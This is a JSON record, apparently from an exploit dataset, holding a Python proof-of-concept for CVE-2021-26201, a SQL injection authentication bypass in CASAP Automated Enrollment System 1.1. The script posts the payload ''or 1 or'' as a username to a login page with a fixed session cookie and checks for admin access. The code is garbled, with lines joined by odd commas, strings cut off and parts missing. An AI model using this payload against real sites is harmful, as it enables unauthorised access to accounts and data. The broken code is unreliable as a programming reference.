{
    "text": "vul_name : CASAP Automated Enrollment System 1.1 SQL Injection ， vul_cve : CVE-2021-26201 ， vul_poc :  # Exploit Title : CASAP Automated Enrollment System 1.1 - ， Authentication Bypass cookie session ，  # Exploit Author :  @ nu11secur1ty ，  # Date : 03.02.2021 ，  # Vendor Homepage :  ，  # Software Link :  ，  # Version : 1.1 ，  # Tested On : Ubuntu + XAMPP 7.3.2 ，  # Description : CASAP Automated Enrollment System 1.0 - Authentication ， Bypass SQLi cookie session ，  # Exploit Link :  ，  # More :  ，  [ Exploit ]  ，  # Creator of the idea : Himanshu Shukla ， print ( \"Author :  @ nu11secur1ty\" )  ，  # Authentication Bypass ， s = requests.Session (  )  ，  # Set Cookie fot testing ，  # PHPSESSID=3g6ghfl8i7qh190m4pq92fv262 # in my case from XSS attack ， cookies = {'PHPSESSID' : 'inucrnag25j9h5hb826kovir0p'} ， print ( \" [  *  ] Attempting Authentication Bypass cookie session.\" )  ， time.sleep ( 1 )  ， values = {\"username\" : \"'or 1 or'\" , \"password\" : \"} ， r=s.post ( url+'login.php' , data=values , cookies=cookies )  ， p=s.get ( url+'dashboard.php' , cookies=cookies )  ，  # Check if Authentication was bypassed or not. ， logged_in = True if ( \"true_admin\" in r.text ) else False ， l=logged_in ， print ( \" [ + ] Authentication Bypass Successful. ! \" )  ， print ( \" [ - ] Failed cookie Authentication exploit ! \" )  ， print ( \" [ - ] Check Your URL\" )  ， print ( \"You Haven't Provided any URL ! \" )  ， print ( \"Usage : python3 exploit.py <URL>\" )  ， print ( \"Example : python3 exploit.py ， exit (  )  ， authbypass ( sys.argv [ 1 ]  )  ， webbrowser.open ( ' ， print ( \" [ - ] Invalid URL ! \" )  ， exit (  )  ，  # BR @ nu11secur1ty ， System Administrator - Infrastructure Engineer ， Penetration Testing Engineer ， Exploit developer at ， hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E= ， nu11secur1ty <",
    "time": "2021.03.02"
}